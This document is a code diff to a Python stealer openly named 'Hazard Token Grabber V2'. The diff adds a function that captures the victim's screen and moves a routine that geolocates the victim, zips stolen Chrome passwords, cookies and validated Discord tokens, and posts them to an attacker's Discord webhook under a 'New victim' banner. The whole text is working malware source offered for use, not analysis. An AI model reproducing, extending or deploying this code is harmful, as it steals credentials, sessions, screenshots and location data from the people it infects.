@@ -1,4 +1,5 @@
-import requests, os, string, random, win32crypt, shutil, sqlite3, zipfile, json, base64, psutil
+import requests, os, string, random, win32crypt, shutil, sqlite3, zipfile, json, base64, psutil, pyautogui, cv2
+import numpy as np
 from re import findall
 from Crypto.Cipher import AES
 
@@ -21,8 +22,9 @@ class Hazard_Token_Grabber_V2:
         self.grabPassword()
         self.grabCookies()
         self.grabTokens()
+        self.screenshot()
         self.SendInfo()
-        self.LogOut()
+        # self.LogOut()
 
     def getheaders(self, token=None, content_type="application/json"):
         headers = {
@@ -62,52 +64,6 @@ class Hazard_Token_Grabber_V2:
             for name in files:
                 discord_file = os.path.join(root, name)
                 os.startfile(discord_file)
-
-    def SendInfo(self):
-        try:
-            data = requests.get("http://ipinfo.io/json", headers=self.getheaders()).json()
-            ip = data['ip']
-            loc = data['loc']
-            city = data['city']
-            country = data['country']
-            region = data['region']
-            googlemap = "https://www.google.com/maps/search/google+map++" + loc
-        except:
-            pass
-        temp = os.path.join(self.tempfolder)
-        new = os.path.join(self.appdata, f'Hazard.V2-[{os.getlogin()}].zip')
-        self.zip(temp, new)
-        for dirname, _, files in os.walk(self.tempfolder):
-            for f in files:
-                self.files += f"\n・{f}"
-        n = 0
-        for r, d, files in os.walk(self.tempfolder):
-            n+= len(files)
-            self.fileCount = f"{n} Files Found: "
-        embed = {
-            "avatar_url":"https://cdn.discordapp.com/attachments/828047793619861557/891537255078985819/nedladdning_9.gif",
-            "embeds": [
-                {
-                    "author": {
-                        "name": "𝑯𝒂𝒛𝒂𝒓𝒅 𝑻𝒐𝒌𝒆𝒏 𝑮𝒓𝒂𝒃𝒃𝒆𝒓.𝑽2",
-                        "url": "https://github.com/Rdimo/Hazard-Token-Grabber-V2",
-                        "icon_url": "https://cdn.discordapp.com/attachments/828047793619861557/891698193245560862/Hazard.gif"
-                    },
-                    "description": f"𝗡𝗲𝘄 𝘃𝗶𝗰𝘁𝗶𝗺 𝘁𝗼 𝑯𝒂𝒛𝒂𝒓𝒅 𝑻𝒐𝒌𝒆𝒏 𝑮𝒓𝒂𝒃𝒃𝒆𝒓.𝑽2\n```fix\nUsername・{os.getlogin()}\nComputerName・{os.getenv('COMPUTERNAME')}\nIP・{ip}\nCity・{city}\nRegion・{region}\nCountry・{country}```[Google Maps Location]({googlemap})\n```fix\n{self.fileCount}{self.files}```",
-                    "color": 16119101,
-
-                    "thumbnail": {
-                      "url": "https://cdn.discordapp.com/attachments/828047793619861557/891537598063980544/nedladdning_10.gif"
-                    },       
-
-                    "footer": {
-                      "text": "©Rdimo#6969・https://github.com/Rdimo/Hazard-Token-Grabber-V2"
-                    }
-                }
-            ]
-        }
-        requests.post(self.webhook, json=embed)
-        requests.post(self.webhook, files={'upload_file': open(new,'rb')})
 
     def get_master_key(self):
         with open(self.appdata+'\\Google\\Chrome\\User Data\\Local State', "r") as f:
@@ -229,6 +185,57 @@ class Hazard_Token_Grabber_V2:
             r = requests.get("https://discord.com/api/v9/users/@me", headers=self.getheaders(token))
             if r.status_code == 200:
                 f.write(f"{token}\n")
+
+    def screenshot(self):
+        image = pyautogui.screenshot()
+        image = cv2.cvtColor(np.array(image), cv2.COLOR_RGB2BGR)
+        cv2.imwrite(self.tempfolder + "\\Screenshot.png", image)
+
+    def SendInfo(self):
+        try:
+            data = requests.get("http://ipinfo.io/json", headers=self.getheaders()).json()
+            ip = data['ip']
+            loc = data['loc']
+            city = data['city']
+            country = data['country']
+            region = data['region']
+            googlemap = "https://www.google.com/maps/search/google+map++" + loc
+        except:
+            pass
+        temp = os.path.join(self.tempfolder)
+        new = os.path.join(self.appdata, f'Hazard.V2-[{os.getlogin()}].zip')
+        self.zip(temp, new)
+        for dirname, _, files in os.walk(self.tempfolder):
+            for f in files:
+                self.files += f"\n・{f}"
+        n = 0
+        for r, d, files in os.walk(self.tempfolder):
+            n+= len(files)
+            self.fileCount = f"{n} Files Found: "
+        embed = {
+            "avatar_url":"https://cdn.discordapp.com/attachments/828047793619861557/891537255078985819/nedladdning_9.gif",
+            "embeds": [
+                {
+                    "author": {
+                        "name": "𝑯𝒂𝒛𝒂𝒓𝒅 𝑻𝒐𝒌𝒆𝒏 𝑮𝒓𝒂𝒃𝒃𝒆𝒓.𝑽2",
+                        "url": "https://github.com/Rdimo/Hazard-Token-Grabber-V2",
+                        "icon_url": "https://cdn.discordapp.com/attachments/828047793619861557/891698193245560862/Hazard.gif"
+                    },
+                    "description": f"𝗡𝗲𝘄 𝘃𝗶𝗰𝘁𝗶𝗺 𝘁𝗼 𝑯𝒂𝒛𝒂𝒓𝒅 𝑻𝒐𝒌𝒆𝒏 𝑮𝒓𝒂𝒃𝒃𝒆𝒓.𝑽2\n```fix\nUsername・{os.getlogin()}\nComputerName・{os.getenv('COMPUTERNAME')}\nIP・{ip}\nCity・{city}\nRegion・{region}\nCountry・{country}```[Google Maps Location]({googlemap})\n```fix\n{self.fileCount}{self.files}```",
+                    "color": 16119101,
+
+                    "thumbnail": {
+                      "url": "https://cdn.discordapp.com/attachments/828047793619861557/891537598063980544/nedladdning_10.gif"
+                    },       
+
+                    "footer": {
+                      "text": "©Rdimo#6969・https://github.com/Rdimo/Hazard-Token-Grabber-V2"
+                    }
+                }
+            ]
+        }
+        requests.post(self.webhook, json=embed)
+        requests.post(self.webhook, files={'upload_file': open(new,'rb')})
 
     def zip(self, src, dst):
         zipped_file = zipfile.ZipFile(dst, "w", zipfile.ZIP_DEFLATED)
